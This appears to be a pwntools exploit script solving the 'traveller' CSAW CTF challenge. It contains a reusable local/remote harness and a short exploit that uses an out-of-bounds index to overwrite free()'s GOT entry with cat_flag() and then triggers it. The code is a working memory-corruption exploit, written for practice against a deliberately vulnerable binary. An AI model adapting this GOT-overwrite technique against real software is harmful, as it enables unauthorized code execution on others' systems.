#!/usr/bin/env python2.7

import argparse
import pwn
import time

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './traveller'
libc = './libc.so.6'
host = 'pwn.chal.csaw.io'
port = 1003

# ====================================================================
#   GLOBALS
# ====================================================================

T      = None      # The Target
LIBC   = None      # Libc ELF
BINARY = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self, pause=True):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            if pause:
                raw_input()

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================

    def sendoption(self, option, data):
        self.tube.sendlineafter('>', str(option))
        self.tube.sendline(str(data))

    def add(self, distance, destination):
        self.sendoption(1, str(distance))
        self.tube.sendline(str(destination))

    def change(self, index, data):
        self.sendoption(2, str(index))
        self.tube.send(str(data))

    def delete(self, index):
        self.sendoption(3, str(index))


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BINARY = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    rela_plt = 0x401f30  # pointer to .rela.plt
    index = (rela_plt - BINARY.symbols['trips']) / 8

    T.attach()

    # (1) write the address of cat_flag() in the GOT entry of free() since it
    # is the first entry in .rela.plt
    T.change(index, pwn.p64(BINARY.symbols['cat_flag']))

    # (2) free something to trigger the call to cat_flag()
    T.delete(index)

    T.interactive()
